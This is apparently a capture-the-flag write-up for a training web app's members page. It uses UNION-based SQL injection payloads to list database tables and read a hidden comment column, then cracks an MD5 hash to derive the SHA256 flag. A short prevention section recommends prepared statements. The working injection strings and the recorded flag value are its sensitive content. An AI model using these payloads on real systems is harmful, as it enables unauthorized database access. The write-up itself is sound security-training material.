# MEMBERS PAGE

## Explanations

Just like the first SQL injection, we will use again our SQL command to get all the tables of the database: 
```sql
1 UNION SELECT column_name, table_name FROM information_schema.columns
```

Last time, we looked into the `users` table. This time, after some investigation, we saw that `list_images` had some interesting things too, particularly in the `comment` column.

```sql
1 UNION SELECT title, comment FROM list_images
```

This request doesn't seem to find list_images table... Let's see to which database it is linked to:
```sql
1 UNION SELECT table_name, table_schema FROM information_schema.colums
```
which gives us:
```
ID: 1 UNION SELECT table_name, table_schema FROM information_schema.columns 
First name: list_images
Surname : Member_images
```

Then let's try this now:
```sql
1 UNION SELECT title, comment FROM Member_images.list_images
```
and we get an interesting response:
```
ID: 1 UNION SELECT title, comment FROM Member_images.list_images 
First name: Hack me ?
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Let's get the flag:
- First MD5 decoding => `albatroz`
- and then SHA256 => `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## How to avoid that security breach ?

A good way to counter that could be to use Prepared statements. ORMs do that trick usually pretty well. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.

---

#### Sources

- [All infos about SQL database](https://stackoverflow.com/questions/600446/how-do-you-return-the-column-names-of-a-table)  
- [SQL injection prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Find Table Names for SQL Injection](https://www.sqlinjection.net/table-names/)
- [MD5 Decrypter](https://md5decrypt.net/)
- [SHA256 Encrypter](https://md5decrypt.net/Sha256/)
